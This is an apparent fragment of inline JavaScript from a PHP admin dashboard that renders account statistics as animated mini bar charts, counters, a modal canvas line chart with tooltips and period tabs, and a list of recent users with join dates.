            var h=data[i]>0?Math.max(((data[i]/mx)*100),8):8;
            var bar=bars[i];
            if(!bar){bar=document.createElement('div');c.appendChild(bar);}
            bar.className='stat-mini-bar'+(data[i]===0?' zero':'');
            bar.style.height=h+'%';bar.setAttribute('data-val',data[i]);bar.setAttribute('data-label',labels[i]||'');bar.setAttribute('data-tl',tl);
            if(l){
                var lb=labelNodes[i];
                if(!lb){lb=document.createElement('div');lb.className='stat-mini-label';l.appendChild(lb);}
                lb.textContent=labels[i]||'';
            }
        }
        if(p){
            var arrow=pct>=0?'<i class="fas fa-arrow-up"></i>':'<i class="fas fa-arrow-down"></i>';
            p.innerHTML=arrow+' '+Math.abs(pct)+'%';
            p.style.color=pct>=0?'rgba(74,222,128,0.6)':'rgba(248,113,113,0.6)';
        }
        if(c.dataset.liveMiniTooltipBound)return;
        c.dataset.liveMiniTooltipBound='1';
        c.addEventListener('mousemove',function(e){
            var tt=document.querySelector('.stat-tooltip');if(!tt)return;
            var bars=c.querySelectorAll('.stat-mini-bar');var hit=null;
            for(var j=0;j<bars.length;j++){var br=bars[j].getBoundingClientRect();if(e.clientX>=br.left&&e.clientX<=br.right){hit=bars[j];break;}}
            if(!hit){return;}
            var val=hit.getAttribute('data-val');var lbl=hit.getAttribute('data-label');var tlbl=hit.getAttribute('data-tl');
            tt.innerHTML='<div class="stat-tooltip-title">'+lbl+'</div><div class="stat-tooltip-row"><span class="stat-tooltip-dot"></span><span class="stat-tooltip-label">'+tlbl+':</span><span class="stat-tooltip-value">'+val+'</span></div>';
            var r=hit.getBoundingClientRect();
            var tx=r.left+r.width/2-50;var ty=r.top-65;
            if(tx<8)tx=8;if(tx+120>window.innerWidth)tx=window.innerWidth-128;if(ty<8)ty=r.bottom+10;
            tt.style.left=tx+'px';tt.style.top=ty+'px';
            tt.classList.add('visible');
        });
        c.addEventListener('mouseleave',function(){
            var tt=document.querySelector('.stat-tooltip');if(tt)tt.classList.remove('visible');
        });
    };
    buildMiniChart('accMiniChart','accMiniLabels','accMiniPct',<?=$accWeeklyJson?>,<?=$accWeeklyLabels?>,'<?= $isTriplehook ? "Triplehook Accounts" : "Accounts" ?>');
    function fmtN(n){return Math.floor(n).toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ');}
    document.querySelectorAll('.counter-animate').forEach(function(el){
        var t=parseInt(el.getAttribute('data-target'))||0;
        if(!t){el.textContent='0';return;}
        var d=1200,s=Math.min(t,60),si=d/s,inc=t/s,cur=0;
        var tm=setInterval(function(){cur+=inc;if(cur>=t){el.textContent=fmtN(t);clearInterval(tm);}else el.textContent=fmtN(Math.floor(cur));},si);
    });
})();
</script>
<script>
document.addEventListener('DOMContentLoaded',function(){
    var ov=document.getElementById('chartModalOverlay');
    var cv=document.getElementById('chartModalCanvas');
    var modal=document.getElementById('chartModalBox');
    var ctx=cv.getContext('2d');
    var cData=null,cLabels=null,anim=0,animId=null,hIdx=-1,isOpen=false,openTs=0;
    var tip=document.createElement('div');tip.className='stat-tooltip stat-tooltip--modal';document.body.appendChild(tip);

    function fmt(n){return Math.floor(n).toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ');}

    function rrPt(t,w,h,r){
        var tw=w-2*r,rh=h-2*r,c=Math.PI*r/2,tot=2*(tw+rh)+4*c,d=t*tot;
        if(d<tw)return{x:r+d,y:1};d-=tw;
        if(d<c){var a=-Math.PI/2+(d/c)*(Math.PI/2);return{x:w-r+Math.cos(a)*r,y:r+Math.sin(a)*r};}d-=c;
        if(d<rh)return{x:w-1,y:r+d};d-=rh;
        if(d<c){var a=(d/c)*(Math.PI/2);return{x:w-r+Math.cos(a)*r,y:h-r+Math.sin(a)*r};}d-=c;
        if(d<tw)return{x:w-r-d,y:h-1};d-=tw;
        if(d<c){var a=Math.PI/2+(d/c)*(Math.PI/2);return{x:r+Math.cos(a)*r,y:h-r+Math.sin(a)*r};}d-=c;
        if(d<rh)return{x:1,y:h-r-d};d-=rh;
        return{x:r,y:1};
    }

    document.querySelectorAll('.neon-hover-card').forEach(function(card){
        var nel=card.querySelector('.neon-border-el');
        if(!nel){nel=document.createElement('div');nel.className='neon-border-el';card.appendChild(nel);}
        if(!card.querySelector('.stat-detail-btn')){var b=document.createElement('div');b.className='stat-detail-btn';b.textContent='View Details';card.appendChild(b);}
        var sh=document.createElement('div');sh.className='card-shimmer';card.appendChild(sh);
        function doSweep(){
            sh.animate([
                {transform:'translateX(-250%) rotate(15deg)'},
                {transform:'translateX(450%) rotate(15deg)'}
            ],{duration:900,easing:'cubic-bezier(.25,.1,.25,1)',fill:'none'});
        }
        if(!window._shimmerCards)window._shimmerCards=[];
        window._shimmerCards.push(doSweep);
        if(!window._shimmerStarted){
            window._shimmerStarted=true;
            setTimeout(function run(){
                window._shimmerCards.forEach(function(fn){fn();});
                setTimeout(run,6000);
            },1500);
        }
        card.addEventListener('mousedown',function(e){
            e.preventDefault();e.stopPropagation();
            if(!isOpen)doOpen(card);
        });
    });

    function doOpen(card){
        isOpen=true;openTs=Date.now();
        var title=card.getAttribute('data-chart-title');
        document.getElementById('chartModalTitle').textContent=title;
        ov._card=card;
        var whoData=card.getAttribute('data-who-list');
        var wb=document.getElementById('whoBtn');
        var wl=document.getElementById('whoListWrap');
        wl.style.display='none';whoShown=false;wb.innerHTML='<i class="fas fa-chevron-right"></i>';
        document.querySelector('.chart-modal-tabs').style.display='';
        cv.style.display='';
        document.querySelector('.chart-modal-summary').style.display='';
        if(whoData && whoData!=='[]'){wb.style.display='';wb._data=whoData;}else{wb.style.display='none';}
        ov.classList.remove('shutting');
        ov.style.display='flex';
        requestAnimationFrame(function(){ov.classList.add('open');});
        document.body.style.overflow='hidden';
        document.querySelectorAll('.chart-modal-tab').forEach(function(t,i){
            t.style.animation='none';t.offsetHeight;
            t.style.animation='tabSlideIn 0.4s cubic-bezier(.34,1.56,.64,1) '+(0.15+i*0.08)+'s both';
        });
        document.querySelectorAll('.chart-modal-stat').forEach(function(s,i){
            s.style.animation='none';s.offsetHeight;
            s.style.animation='summaryPop 0.5s cubic-bezier(.34,1.56,.64,1) '+(0.3+i*0.1)+'s both';
        });
        document.querySelectorAll('.chart-modal-tab').forEach(function(t){t.classList.remove('active');});
        var ft=document.querySelector('.chart-modal-tab[data-period="weekly"]');
        if(ft)ft.classList.add('active');
        loadData('weekly',card,'7 Days');
        setTimeout(function(){
            anim=0;hIdx=-1;if(animId)cancelAnimationFrame(animId);
            doAnim();
        },550);
    }

    function doClose(){
        if(!isOpen)return;
        if(Date.now()-openTs<600)return;
        whoShown=false;
        document.getElementById('whoListWrap').style.display='none';
        document.getElementById('whoBtn').innerHTML='<i class="fas fa-chevron-right"></i>';
        ov.classList.add('shutting');
        ov.classList.remove('open');
        isOpen=false;tip.classList.remove('visible');tipActive=false;if(tipRaf){cancelAnimationFrame(tipRaf);tipRaf=null;}
        if(animId)cancelAnimationFrame(animId);
        setTimeout(function(){ov.style.display='none';ov.classList.remove('shutting');document.body.style.overflow='';},350);
    }

    function loadData(dk,card,periodText){
        cData=JSON.parse(card.getAttribute('data-'+dk)||'[]');
        cLabels=JSON.parse(card.getAttribute('data-'+dk+'-labels')||'[]');
        var tot=cData.reduce(function(a,b){return a+b;},0);
        var pk=0,pkIdx=0;
        for(var i=0;i<cData.length;i++){if(cData[i]>pk){pk=cData[i];pkIdx=i;}}
        var pkLabel=cLabels[pkIdx]||'';
        var pkPct=tot>0?((pk/tot)*100):0;
        document.getElementById('cmTotal').textContent=fmt(tot);
        document.getElementById('cmPeak').textContent=pk>0?fmt(pk)+' ('+pkLabel+')':'0';
        document.getElementById('cmAvg').textContent=pkPct>0?(pkPct<10?pkPct.toFixed(2):Math.round(pkPct))+'%':'0%';
        var pt=periodText||'today';
        if(pt==='today'){
            document.getElementById('cmLabel1').textContent='Total (Today)';
            document.getElementById('cmLabel2').textContent='Highest Hour';
            document.getElementById('cmLabel3').textContent='Peak Hour %';
        }else if(pt==='7 Days'){
            document.getElementById('cmLabel1').textContent='Total (7 Days)';
            document.getElementById('cmLabel2').textContent='Highest Day';
            document.getElementById('cmLabel3').textContent='Peak Day %';
        }else{
            document.getElementById('cmLabel1').textContent='Total (30 Days)';
            document.getElementById('cmLabel2').textContent='Highest Day';
            document.getElementById('cmLabel3').textContent='Peak Day %';
        }
    }

    ov.addEventListener('mousedown',function(e){if(e.target===ov)doClose();});
    modal.addEventListener('mousedown',function(e){e.stopPropagation();});
    document.addEventListener('keydown',function(e){if(e.key==='Escape'&&isOpen)doClose();});

    function timeAgo(ds){
        if(!ds)return '';
        var d=new Date(ds),now=new Date(),diff=Math.floor((now-d)/86400000);
        if(diff<0)diff=0;
        if(diff===0)return 'Today';
        if(diff===1)return '1 day ago';
        if(diff<30)return diff+' days ago';
        if(diff<365){var m=Math.floor(diff/30);return m===1?'1 month ago':m+' months ago';}
        var y=Math.floor(diff/365);var rm=Math.floor((diff%365)/30);
        return y+'y'+(rm>0?' '+rm+'m':'');
    }
    function fmtDate(ds){
        if(!ds)return '';
        var d=new Date(ds);
        var months=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
        return months[d.getMonth()]+' '+d.getDate()+', '+d.getFullYear();
    }
    var whoShown=false;
    document.getElementById('whoBtn').addEventListener('click',function(e){
        e.stopPropagation();
        var wb=this;
        var chartEls=[document.querySelector('.chart-modal-tabs'),cv,document.querySelector('.chart-modal-summary')];
        var wl=document.getElementById('whoListWrap');
        if(whoShown){
            whoShown=false;wb.innerHTML='<i class="fas fa-chevron-right"></i>';
            wl.style.display='none';
            chartEls.forEach(function(el){if(el)el.style.display='';});
            anim=0;hIdx=-1;if(animId)cancelAnimationFrame(animId);doAnim();
            return;
        }
        whoShown=true;wb.innerHTML='<i class="fas fa-chevron-left"></i>';
        chartEls.forEach(function(el){if(el)el.style.display='none';});
        var list=[];try{list=JSON.parse(wb._data||'[]');}catch(ex){}
        var container=document.getElementById('whoPhoneList');
        if(!list.length){container.innerHTML='<div class="who-empty">No users yet</div>';wl.style.display='';return;}
        var html='';
        for(var i=0;i<list.length;i++){
            var u=list[i];
            var av=u.a?'<img class="who-row-av" src="'+u.a+'" alt="">':'<div class="who-row-av-ph"><i class="fas fa-user"></i></div>';
            html+='<div class="who-row" style="animation-delay:'+(i*0.04)+'s">'+av+'<div class="who-row-info"><span class="who-row-name">'+u.n+'</span><span class="who-row-date">'+fmtDate(u.d)+' &middot; '+timeAgo(u.d)+'</span></div></div>';
        }
        container.innerHTML=html;
        wl.style.display='';
    });

    document.querySelectorAll('.chart-modal-tab').forEach(function(tab){
        tab.addEventListener('mousedown',function(e){e.stopPropagation();});
        tab.addEventListener('click',function(){
            document.querySelectorAll('.chart-modal-tab').forEach(function(t){t.classList.remove('active');});
            tab.classList.add('active');
            var p=tab.getAttribute('data-period');
            var dk=p==='today'?'hourly':p;
            var pText=p==='today'?'today':p==='weekly'?'7 Days':'30 Days';
            var card=ov._card;if(!card)return;
            loadData(dk,card,pText);
            anim=0;hIdx=-1;if(animId)cancelAnimationFrame(animId);
            doAnim();
        });
    });

    function doAnim(){
        anim+=0.025;if(anim>1)anim=1;
        drawChart(1-Math.pow(1-anim,3));
        if(anim<1)animId=requestAnimationFrame(doAnim);
    }

    function drawChart(p){
        var dp=window.devicePixelRatio||1;
        var r=cv.getBoundingClientRect();
        if(r.width<20||r.height<20)return;
        cv.width=r.width*dp;cv.height=r.height*dp;
        ctx.scale(dp,dp);
        var w=r.width,h=r.height;
        ctx.clearRect(0,0,w,h);
        if(!cData||!cData.length)return;
        var px=42,pr=20,pt=20,pb=38,cw=w-px-pr,ch=h-pt-pb;
        var mx=Math.max.apply(null,cData)||1,len=cData.length,st=cw/(len-1||1);
        ctx.strokeStyle='rgba(255,255,255,0.03)';ctx.lineWidth=1;
        for(var g=0;g<5;g++){
            var gy=pt+(ch/4)*g;ctx.beginPath();ctx.moveTo(px,gy);ctx.lineTo(w-pr,gy);ctx.stroke();
            ctx.fillStyle='rgba(255,255,255,0.18)';ctx.font='500 10px DM Sans';ctx.textAlign='right';
            ctx.fillText(fmt(Math.round(mx-(mx/4)*g)),px-8,gy+3);
        }
        var pts=[];
        for(var i=0;i<len;i++){var x=px+i*st;pts.push({x:x,y:pt+ch-(cData[i]*p/mx)*ch,v:cData[i]});}
        var grd=ctx.createLinearGradient(0,pt,0,pt+ch);
        grd.addColorStop(0,'rgba(255,255,255,0.05)');grd.addColorStop(0.5,'rgba(255,255,255,0.02)');grd.addColorStop(1,'rgba(255,255,255,0)');
        ctx.beginPath();ctx.moveTo(pts[0].x,pt+ch);
        for(var i=0;i<len;i++){
            if(!i){ctx.lineTo(pts[i].x,pts[i].y);continue;}
            ctx.bezierCurveTo(pts[i-1].x+st*0.4,pts[i-1].y,pts[i].x-st*0.4,pts[i].y,pts[i].x,pts[i].y);
        }
        ctx.lineTo(pts[len-1].x,pt+ch);ctx.closePath();ctx.fillStyle=grd;ctx.fill();
        ctx.beginPath();
        for(var i=0;i<len;i++){
            if(!i){ctx.moveTo(pts[i].x,pts[i].y);continue;}
            ctx.bezierCurveTo(pts[i-1].x+st*0.4,pts[i-1].y,pts[i].x-st*0.4,pts[i].y,pts[i].x,pts[i].y);
        }
        ctx.strokeStyle='rgba(255,255,255,0.2)';ctx.lineWidth=2;ctx.stroke();
        ctx.shadowBlur=4;ctx.shadowColor='rgba(255,255,255,0.06)';ctx.stroke();ctx.shadowBlur=0;
        var ls=len<=8?1:len<=14?2:Math.ceil(len/8);
        ctx.fillStyle='rgba(255,255,255,0.22)';ctx.font='500 10px DM Sans';ctx.textAlign='center';
        for(var i=0;i<len;i++){if(i%ls===0||i===len-1)ctx.fillText(cLabels[i]||'',pts[i].x,h-10);}
        if(hIdx>=0&&hIdx<len){
            var hp=pts[hIdx];
            ctx.setLineDash([4,4]);ctx.beginPath();ctx.moveTo(hp.x,pt);ctx.lineTo(hp.x,pt+ch);
            ctx.strokeStyle='rgba(255,255,255,0.06)';ctx.lineWidth=1;ctx.stroke();ctx.setLineDash([]);
        }
    }

    var tipX=0,tipY=0,tipTX=0,tipTY=0,tipRaf=null,tipActive=false;
    function tipLerp(){
        tipX+=(tipTX-tipX)*0.15;tipY+=(tipTY-tipY)*0.15;
        tip.style.left=Math.round(tipX)+'px';tip.style.top=Math.round(tipY)+'px';
        if(Math.abs(tipTX-tipX)>0.5||Math.abs(tipTY-tipY)>0.5){tipRaf=requestAnimationFrame(tipLerp);}
        else{tip.style.left=tipTX+'px';tip.style.top=tipTY+'px';tipRaf=null;}
    }
    function moveTip(x,y){tipTX=x;tipTY=y;if(!tipRaf)tipRaf=requestAnimationFrame(tipLerp);}

    cv.addEventListener('mousemove',function(e){
        if(!cData||!cData.length)return;
        var r=cv.getBoundingClientRect(),mx=e.clientX-r.left,px=42,pr=20;
        var st=(r.width-px-pr)/(cData.length-1||1);
        var idx=Math.max(0,Math.min(cData.length-1,Math.round((mx-px)/st)));
        if(idx!==hIdx){hIdx=idx;drawChart(Math.min(anim,1));}
        var tLabel=document.getElementById('chartModalTitle').textContent||'Total';
        tip.innerHTML='<div class="stat-tooltip-title">'+(cLabels[idx]||'')+'</div><div class="stat-tooltip-row"><span class="stat-tooltip-label">'+tLabel+'</span><span class="stat-tooltip-value">'+fmt(cData[idx]||0)+'</span></div>';
        var ptX=r.left+px+idx*st;
        var ptY=r.top+20+(r.height-20-38)-(cData[idx]/(Math.max.apply(null,cData)||1))*(r.height-20-38)*Math.min(anim,1);
        var tx=ptX+15,ty=ptY-65;
        if(tx+150>window.innerWidth)tx=ptX-160;if(ty<10)ty=ptY+20;
        if(!tipActive){tipX=tx;tipY=ty;tip.style.left=tx+'px';tip.style.top=ty+'px';tipActive=true;}
        else{moveTip(tx,ty);}
        tip.classList.add('visible');
    });
    cv.addEventListener('mouseleave',function(){hIdx=-1;drawChart(Math.min(anim,1));tip.classList.remove('visible');tipActive=false;if(tipRaf){cancelAnimationFrame(tipRaf);tipRaf=null;}});
});
</script>
